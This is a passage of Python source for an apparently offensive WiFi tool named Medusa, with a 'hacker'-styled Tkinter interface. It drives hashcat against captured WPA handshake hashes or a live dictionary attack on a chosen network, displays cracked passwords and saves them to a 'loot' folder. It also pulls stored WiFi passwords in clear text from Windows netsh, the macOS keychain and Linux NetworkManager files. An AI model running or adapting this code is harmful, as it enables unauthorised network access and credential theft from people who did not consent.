        self.op_status_label.config(text="● Cracking...", fg=HACKER_THEME["status_busy"])
        self.op_progress.pack(fill=tk.X, side=tk.BOTTOM, padx=8, pady=(0, 4))
        self.op_progress.start(10)
        self.footer_mode.config(text="Mode: CRACKING", fg=HACKER_THEME["fg_magenta"])
        
        if self._selected_network:
            self._log(f"Starting crack on {self._selected_network.get('ssid', '?')}", "info")
        else:
            self._log("Starting hash cracking...", "info")
        
        thread = threading.Thread(target=self._crack_worker, daemon=True, name="crack-worker")
        self._threads["crack"] = thread
        thread.start()
    
    def _crack_worker(self):
        """Background crack worker."""
        stop_event = self._stop_events.get("crack")
        wordlist = self.wordlist_var.get()
        use_gpu = self.gpu_var.get()
        threads = int(self.threads_var.get()) if self.threads_var.get().isdigit() else 4
        
        # Check if hashcat is available for faster cracking
        hashcat_path = shutil.which("hashcat")
        
        if hashcat_path and self._selected_network:
            # Look for a .hc22000 or .16800 file for hashcat
            cap_dir = CAPTURE_DIR
            hash_files = list(cap_dir.glob("*.hc22000")) + list(cap_dir.glob("*.16800"))
            
            if hash_files:
                hash_file = str(hash_files[-1])  # Use most recent
                self.root.after(0, self._log, f"Using hashcat with {hash_file}", "info")
                self._hashcat_crack(hash_file, wordlist, hashcat_path, use_gpu, stop_event)
                return
        
        # Fall back to dictionary attack
        if self._selected_network:
            self.root.after(0, self._log, "No hash file found. Using live dictionary attack.", "info")
            self._dictionary_attack_worker(self._selected_network, stop_event)
        else:
            self.root.after(0, self._log, "No target network selected for live attack.", "err")
        
        self.root.after(0, self._crack_complete)
    
    def _hashcat_crack(self, hash_file: str, wordlist: str, hashcat_path: str, use_gpu: bool, stop_event: threading.Event):
        """Run hashcat subprocess for GPU/CPU cracking."""
        self.root.after(0, self._log, f"Hashcat: {hash_file} with {wordlist}", "info")
        
        # Determine hash type from file extension
        if hash_file.endswith('.16800'):
            hash_type = "16800"
        else:
            hash_type = "22000"
        
        cmd = [
            hashcat_path,
            "-m", hash_type,
            "-a", "0",
            "-o", str(CAPTURE_DIR / "cracked.txt"),
            "--potfile-path", str(CAPTURE_DIR / "medusa.potfile"),
            "--status",
            "--status-timer", "5",
            "--force",
            hash_file,
            wordlist,
        ]
        
        if use_gpu:
            cmd.append("--backend-devices=1")
        else:
            cmd.extend(["--backend-devices=0", "--force"])
        
        if stop_event:
            cmd.extend(["--runtime", "3600"])  # Max 1 hour
        
        self.root.after(0, self._log, f"Running: {' '.join(cmd)}", "info")
        
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
            
            for line in iter(process.stdout.readline, ''):
                if stop_event and stop_event.is_set():
                    process.terminate()
                    self.root.after(0, self._log, "Hashcat terminated by user.", "warn")
                    return
                
                # Parse hashcat status
                if "Candidates" in line:
                    self.root.after(0, self.term_status_label.config, 
                                   text=f"[hashcat] {line.strip()[:60]}")
                elif "Speed" in line:
                    self.root.after(0, self.footer_packets.config, 
                                   text=f"Speed: {line.strip()[:40]}")
                elif line.strip():
                    self.root.after(0, self._log, f"[hashcat] {line.strip()}", "info")
            
            process.wait()
            
            # Check for cracked password
            potfile = CAPTURE_DIR / "medusa.potfile"
            if potfile.exists():
                content = potfile.read_text().strip()
                if content:
                    # Format: hash:password
                    if ':' in content:
                        password = content.split(':')[-1]
                        self.root.after(0, self._log, f"🔓 PASSWORD FOUND: {password}", "found")
                        self.root.after(0, self._show_password_found, password)
            
            self.root.after(0, self._log, "Hashcat finished.", "ok")
        
        except FileNotFoundError:
            self.root.after(0, self._log, "hashcat not found. Install hashcat or use dictionary mode.", "err")
        except Exception as e:
            self.root.after(0, self._log, f"Hashcat error: {e}", "err")
    
    def _show_password_found(self, password: str):
        """Show a dialog when password is found."""
        dialog = tk.Toplevel(self.root)
        dialog.title("🔓 PASSWORD FOUND")
        dialog.geometry("500x200")
        dialog.configure(bg=HACKER_THEME["bg_dark"])
        dialog.transient(self.root)
        dialog.grab_set()
        
        # Flashy green text
        tk.Label(dialog, text="✓ PASSWORD CRACKED ✓",
                font=("Consolas", 16, "bold"),
                fg=HACKER_THEME["fg_bright"], bg=HACKER_THEME["bg_dark"]).pack(pady=(20, 10))
        
        tk.Label(dialog, text=f"SSID: {self._selected_network.get('ssid', '?') if self._selected_network else '?'}",
                font=("Consolas", 12), fg=HACKER_THEME["fg_primary"], bg=HACKER_THEME["bg_dark"]).pack()
        
        password_frame = tk.Frame(dialog, bg=HACKER_THEME["bg_medium"], bd=1, relief="solid",
                                 highlightbackground=HACKER_THEME["accent"])
        password_frame.pack(pady=15, padx=30, fill=tk.X)
        
        tk.Label(password_frame, text=password,
                font=("Consolas", 18, "bold"),
                fg=HACKER_THEME["accent"], bg=HACKER_THEME["bg_medium"]).pack(pady=10)
        
        btn_frame = tk.Frame(dialog, bg=HACKER_THEME["bg_dark"])
        btn_frame.pack(pady=10)
        
        tk.Button(btn_frame, text="COPY", font=("Consolas", 10, "bold"),
                 bg=HACKER_THEME["button_bg"], fg=HACKER_THEME["button_fg"],
                 command=lambda: self._copy_to_clipboard(password)).pack(side=tk.LEFT, padx=5)
        
        tk.Button(btn_frame, text="SAVE TO LOOT", font=("Consolas", 10, "bold"),
                 bg=HACKER_THEME["button_bg"], fg=HACKER_THEME["fg_yellow"],
                 command=lambda: self._save_password_to_loot(password)).pack(side=tk.LEFT, padx=5)
        
        tk.Button(btn_frame, text="DISMISS", font=("Consolas", 10),
                 bg=HACKER_THEME["button_bg"], fg=HACKER_THEME["fg_red"],
                 command=dialog.destroy).pack(side=tk.LEFT, padx=5)
    
    def _save_password_to_loot(self, password: str):
        """Save cracked password to loot directory."""
        LOOT_DIR.mkdir(parents=True, exist_ok=True)
        loot_file = LOOT_DIR / f"cracked_{current_timestamp('file')}.txt"
        
        try:
            with open(loot_file, 'w') as f:
                f.write(f"MEDUSA CRACKED PASSWORD\n")
                f.write(f"{'=' * 40}\n")
                f.write(f"SSID: {self._selected_network.get('ssid', '?') if self._selected_network else '?'}\n")
                f.write(f"BSSID: {self._selected_network.get('bssid', '?') if self._selected_network else '?'}\n")
                f.write(f"Password: {password}\n")
                f.write(f"Cracked: {current_timestamp()}\n")
            
            self._log(f"Password saved to {loot_file}", "ok")
            messagebox.showinfo("Saved", f"Password saved to:\n{loot_file}")
        except Exception as e:
            self._log(f"Failed to save password: {e}", "err")
    
    def _crack_complete(self):
        """Called when crack finishes (main thread)."""
        self._crack_in_progress = False
        self._stop_events.pop("crack", None)
        
        self.btn_crack.config(state=tk.NORMAL, text="▶ START CRACKING")
        self.btn_crack_stop.config(state=tk.DISABLED)
        
        if not self._attack_in_progress and not self._capture_in_progress:
            self.op_progress.stop()
            self.op_progress.pack_forget()
            self.op_status_label.config(text="● Ready", fg=HACKER_THEME["status_ready"])
            self.footer_mode.config(text="Mode: Ready", fg=HACKER_THEME["fg_primary"])
    
    def _stop_crack(self):
        """Stop an ongoing crack."""
        stop_event = self._stop_events.get("crack")
        if stop_event:
            stop_event.set()
            self._log("Crack stopped by user.", "warn")
    
    # ========================================================================
    # OS-SPECIFIC TOOLS
    # ========================================================================
    
    def _extract_profiles(self):
        """Extract stored WiFi profiles (threaded)."""
        if not CAN_EXTRACT_WIFI_PROFILES:
            self._log("Profile extraction not supported on this platform.", "err")
            return
        
        self._log("Extracting stored WiFi profiles...", "info")
        
        thread = threading.Thread(target=self._extract_profiles_worker, daemon=True)
        thread.start()
    
    def _extract_profiles_worker(self):
        """Background profile extraction worker."""
        profiles = []
        
        try:
            if IS_WINDOWS:
                result = subprocess.run(
                    ["netsh", "wlan", "show", "profiles"],
                    capture_output=True, text=True, timeout=15,
                )
                
                for line in result.stdout.split('\n'):
                    match = re.search(r':\s*(.+)$', line)
                    if match:
                        profile = match.group(1).strip()
                        pw_result = subprocess.run(
                            ["netsh", "wlan", "show", "profile", f"name={profile}", "key=clear"],
                            capture_output=True, text=True, timeout=10,
                        )
                        pw_match = re.search(r'Key Content\s*:\s*(.+)', pw_result.stdout)
                        password = pw_match.group(1).strip() if pw_match else ""
                        profiles.append({"ssid": profile, "password": password})
            
            elif IS_MACOS:
                result = subprocess.run(
                    ["/usr/sbin/networksetup", "-listpreferredwirelessnetworks", "en0"],
                    capture_output=True, text=True, timeout=15,
                )
                
                for line in result.stdout.split('\n'):
                    ssid = line.strip()
                    if ssid and not ssid.startswith('Preferred'):
                        pw_result = subprocess.run(
                            ["security", "find-generic-password", "-wa", ssid],
                            capture_output=True, text=True, timeout=10,
                        )
                        password = pw_result.stdout.strip() if pw_result.returncode == 0 else ""
                        profiles.append({"ssid": ssid, "password": password})
            
            elif IS_LINUX:
                nm_dir = Path("/etc/NetworkManager/system-connections")
                if nm_dir.exists():
                    for conn_file in nm_dir.glob("*"):
                        ssid = conn_file.stem
                        password = ""
                        try:
                            content = conn_file.read_text()
                            m = re.search(r'psk=(.+)', content)
                            if m:
                                password = m.group(1)
                        except (IOError, PermissionError):
                            pass
                        profiles.append({"ssid": ssid, "password": password})
            
            # Display and save results on main thread
            self.root.after(0, self._display_profiles, profiles)
            
        except Exception as e:
            self.root.after(0, self._log, f"Profile extraction error: {e}", "err")
    
    def _display_profiles(self, profiles: List[Dict]):
        """Display extracted profiles in terminal and save to loot."""
        if not profiles:
            self._log("No WiFi profiles found.", "warn")
            return
        
        self._log(f"Found {len(profiles)} stored WiFi profiles:", "ok")
        
        for p in profiles:



